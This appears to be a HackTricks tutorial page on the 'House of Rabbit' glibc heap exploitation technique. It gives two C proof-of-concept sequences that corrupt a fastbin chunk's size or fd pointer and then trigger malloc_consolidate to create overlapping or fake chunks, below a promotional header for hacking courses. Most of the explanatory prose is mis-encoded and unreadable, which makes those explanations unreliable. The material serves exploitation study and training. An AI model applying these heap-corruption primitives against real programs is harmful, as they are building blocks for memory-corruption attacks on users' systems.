# House of Rabbit

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Requirements

1. **–ó–¥–∞—Ç–Ω—ñ—Å—Ç—å –º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ fd —à–≤–∏–¥–∫–æ–≥–æ –±—ñ–Ω –∞–±–æ —Ä–æ–∑–º—ñ—Ä**: –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –≤–ø–µ—Ä–µ–¥ –¥–ª—è —á–∞—Å—Ç–∏–Ω–∏ –≤ —à–≤–∏–¥–∫–æ–º—É –±—ñ–Ω—ñ –∞–±–æ —ó—ó —Ä–æ–∑–º—ñ—Ä.
2. **–ó–¥–∞—Ç–Ω—ñ—Å—Ç—å –≤–∏–∫–ª–∏–∫–∞—Ç–∏ `malloc_consolidate`**: –¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏, –∞–±–æ –≤–∏–¥—ñ–ª–∏–≤—à–∏ –≤–µ–ª–∏–∫—É —á–∞—Å—Ç–∏–Ω—É, –∞–±–æ –æ–±'—î–¥–Ω–∞–≤—à–∏ –≤–µ—Ä—Ö–Ω—é —á–∞—Å—Ç–∏–Ω—É, —â–æ –∑–º—É—à—É—î –∫—É–ø—É –æ–±'—î–¥–Ω—É–≤–∞—Ç–∏ —á–∞—Å—Ç–∏–Ω–∏.

### Goals

1. **–°—Ç–≤–æ—Ä–∏—Ç–∏ –ø–µ—Ä–µ–∫—Ä–∏–≤–∞—é—á—ñ —á–∞—Å—Ç–∏–Ω–∏**: –©–æ–± –æ–¥–Ω–∞ —á–∞—Å—Ç–∏–Ω–∞ –ø–µ—Ä–µ–∫—Ä–∏–≤–∞–ª–∞—Å—è –∑ —ñ–Ω—à–æ—é, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ–¥–∞–ª—å—à—ñ –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó –∑ –∫—É–ø–æ—é.
2. **–ü—ñ–¥—Ä–æ–±–∏—Ç–∏ —Ñ–∞–ª—å—à–∏–≤—ñ —á–∞—Å—Ç–∏–Ω–∏**: –©–æ–± –æ–±–º–∞–Ω—É—Ç–∏ –∞–ª–ª–æ–∫–∞—Ç–æ—Ä, –∑–º—É—Å–∏–≤—à–∏ –π–æ–≥–æ –≤–≤–∞–∂–∞—Ç–∏ —Ñ–∞–ª—å—à–∏–≤—É —á–∞—Å—Ç–∏–Ω—É –ª–µ–≥—ñ—Ç–∏–º–Ω–æ—é –ø—ñ–¥ —á–∞—Å –æ–ø–µ—Ä–∞—Ü—ñ–π –∑ –∫—É–ø–æ—é.

## Steps of the attack

### POC 1: Modify the size of a fast bin chunk

**Objective**: Create an overlapping chunk by manipulating the size of a fastbin chunk.

* **Step 1: Allocate Chunks**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
–ú–∏ –≤–∏–¥—ñ–ª—è—î–º–æ –¥–≤–∞ —à–º–∞—Ç–∫–∏ –ø–æ 0x40 –±–∞–π—Ç –∫–æ–∂–µ–Ω. –¶—ñ —à–º–∞—Ç–∫–∏ –±—É–¥—É—Ç—å –ø–æ–º—ñ—â–µ–Ω—ñ –≤ —Å–ø–∏—Å–æ–∫ —à–≤–∏–¥–∫–∏—Ö –±—ñ–Ω—ñ–≤ –ø—ñ—Å–ª—è –∑–≤—ñ–ª—å–Ω–µ–Ω–Ω—è.

* **–ö—Ä–æ–∫ 2: –ó–≤—ñ–ª—å–Ω–∏—Ç–∏ —à–º–∞—Ç–∫–∏**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
–ú–∏ –∑–≤—ñ–ª—å–Ω—è—î–º–æ –æ–±–∏–¥–≤–∞ —à–º–∞—Ç–∫–∏, –¥–æ–¥–∞—é—á–∏ —ó—Ö –¥–æ —Å–ø–∏—Å–∫—É fastbin.

* **–ö—Ä–æ–∫ 3: –ó–º—ñ–Ω–∏—Ç–∏ –†–æ–∑–º—ñ—Ä –®–º–∞—Ç–∫–∞**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
–ú–∏ –∑–º—ñ–Ω—é—î–º–æ –º–µ—Ç–∞–¥–∞–Ω—ñ —Ä–æ–∑–º—ñ—Ä—É `chunk1` –Ω–∞ 0xa1. –¶–µ –∫—Ä–∏—Ç–∏—á–Ω–æ –≤–∞–∂–ª–∏–≤–∏–π –∫—Ä–æ–∫, —â–æ–± –æ–±–º–∞–Ω—É—Ç–∏ –∞–ª–ª–æ–∫–∞—Ç–æ—Ä –ø—ñ–¥ —á–∞—Å –∫–æ–Ω—Å–æ–ª—ñ–¥–∞—Ü—ñ—ó.

* **–ö—Ä–æ–∫ 4: –í–∏–∫–ª–∏–∫–∞—Ç–∏ `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
–í–∏–¥—ñ–ª–µ–Ω–Ω—è –≤–µ–ª–∏–∫–æ–≥–æ –±–ª–æ–∫—É –≤–∏–∫–ª–∏–∫–∞—î —Ñ—É–Ω–∫—Ü—ñ—é `malloc_consolidate`, –æ–±'—î–¥–Ω—É—é—á–∏ –º–∞–ª–µ–Ω—å–∫—ñ –±–ª–æ–∫–∏ –≤ —à–≤–∏–¥–∫–æ–º—É –±—ñ–Ω. –ú–∞–Ω—ñ–ø—É–ª—å–æ–≤–∞–Ω–∏–π —Ä–æ–∑–º—ñ—Ä `chunk1` –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –π–æ–≥–æ –ø–µ—Ä–µ–∫—Ä–∏—Ç—Ç—è –∑ `chunk2`.

–ü—ñ—Å–ª—è –∫–æ–Ω—Å–æ–ª—ñ–¥–∞—Ü—ñ—ó `chunk1` –ø–µ—Ä–µ–∫—Ä–∏–≤–∞—î—Ç—å—Å—è –∑ `chunk2`, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ–¥–∞–ª—å—à—ñ–π –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó.

### POC 2: –ó–º—ñ–Ω–∏—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ `fd`

**–ú–µ—Ç–∞**: –°—Ç–≤–æ—Ä–∏—Ç–∏ —Ñ–µ–π–∫–æ–≤–∏–π –±–ª–æ–∫, –º–∞–Ω—ñ–ø—É–ª—é—é—á–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–º `fd` —à–≤–∏–¥–∫–æ–≥–æ –±—ñ–Ω–∞.

* **–ö—Ä–æ–∫ 1: –í–∏–¥—ñ–ª–∏—Ç–∏ –±–ª–æ–∫–∏**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**–ü–æ—è—Å–Ω–µ–Ω–Ω—è**: –ú–∏ –≤–∏–¥—ñ–ª—è—î–º–æ –¥–≤–∞ —à–º–∞—Ç–∫–∏, –æ–¥–∏–Ω –º–µ–Ω—à–∏–π —ñ –æ–¥–∏–Ω –±—ñ–ª—å—à–∏–π, —â–æ–± –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –∫—É–ø—É –¥–ª—è —Ñ–µ–π–∫–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞.

* **–ö—Ä–æ–∫ 2: –°—Ç–≤–æ—Ä–∏—Ç–∏ —Ñ–µ–π–∫–æ–≤–∏–π —à–º–∞—Ç–æ–∫**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
–ú–∏ –∑–∞–ø–∏—Å—É—î–º–æ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω—É –º–µ—Ç–∞–¥–∞–Ω—ñ —á–∞—Å—Ç–∏–Ω–∏ –≤ `chunk2`, —â–æ–± –∑–º–æ–¥–µ–ª—é–≤–∞—Ç–∏ –º–µ–Ω—à—ñ —á–∞—Å—Ç–∏–Ω–∏.

* **–ö—Ä–æ–∫ 3: –ó–≤—ñ–ª—å–Ω–∏—Ç–∏ `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**–ü–æ—è—Å–Ω–µ–Ω–Ω—è**: –ú–∏ –∑–≤—ñ–ª—å–Ω—è—î–º–æ `chunk1`, –¥–æ–¥–∞—é—á–∏ –π–æ–≥–æ –¥–æ —Å–ø–∏—Å–∫—É fastbin.

* **–ö—Ä–æ–∫ 4: –ó–º—ñ–Ω–∏—Ç–∏ `fd` `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**–ü–æ—è—Å–Ω–µ–Ω–Ω—è**: –ú–∏ –∑–º—ñ–Ω—é—î–º–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –≤–ø–µ—Ä–µ–¥ (`fd`) `chunk1`, —â–æ–± –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ –Ω–∞—à —Ñ–µ–π–∫–æ–≤–∏–π —à–º–∞—Ç–æ–∫ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `chunk2`.

* **–ö—Ä–æ–∫ 5: –í–∏–∫–ª–∏–∫–∞—Ç–∏ `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
–í–∏–¥—ñ–ª–µ–Ω–Ω—è –≤–µ–ª–∏–∫–æ–≥–æ –±–ª–æ–∫—É –∑–Ω–æ–≤—É –≤–∏–∫–ª–∏–∫–∞—î `malloc_consolidate`, —è–∫–∏–π –æ–±—Ä–æ–±–ª—è—î —Ñ–µ–π–∫–æ–≤–∏–π –±–ª–æ–∫.

–§–µ–π–∫–æ–≤–∏–π –±–ª–æ–∫ —Å—Ç–∞—î —á–∞—Å—Ç–∏–Ω–æ—é —Å–ø–∏—Å–∫—É fastbin, —â–æ —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –ª–µ–≥—ñ—Ç–∏–º–Ω–∏–º –±–ª–æ–∫–æ–º –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó.

### –†–µ–∑—é–º–µ

–¢–µ—Ö–Ω—ñ–∫–∞ **House of Rabbit** –ø–æ–ª—è–≥–∞—î –≤ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ä–æ–∑–º—ñ—Ä—É –±–ª–æ–∫—É fast bin –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–µ—Ä–µ–∫—Ä–∏–≤–∞—é—á–∏—Ö –±–ª–æ–∫—ñ–≤ –∞–±–æ –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–º `fd` –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ–µ–π–∫–æ–≤–∏—Ö –±–ª–æ–∫—ñ–≤. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –ø—ñ–¥—Ä–æ–±–ª—è—Ç–∏ –ª–µ–≥—ñ—Ç–∏–º–Ω—ñ –±–ª–æ–∫–∏ –≤ –∫—É–ø—ñ, —â–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—î –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–ª—è —Ä—ñ–∑–Ω–∏—Ö —Ñ–æ—Ä–º –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó. –†–æ–∑—É–º—ñ–Ω–Ω—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫–∞ —Ü–∏—Ö –∫—Ä–æ–∫—ñ–≤ –ø–æ–∫—Ä–∞—â–∏—Ç—å –≤–∞—à—ñ –Ω–∞–≤–∏—á–∫–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –∫—É–ø–∏.
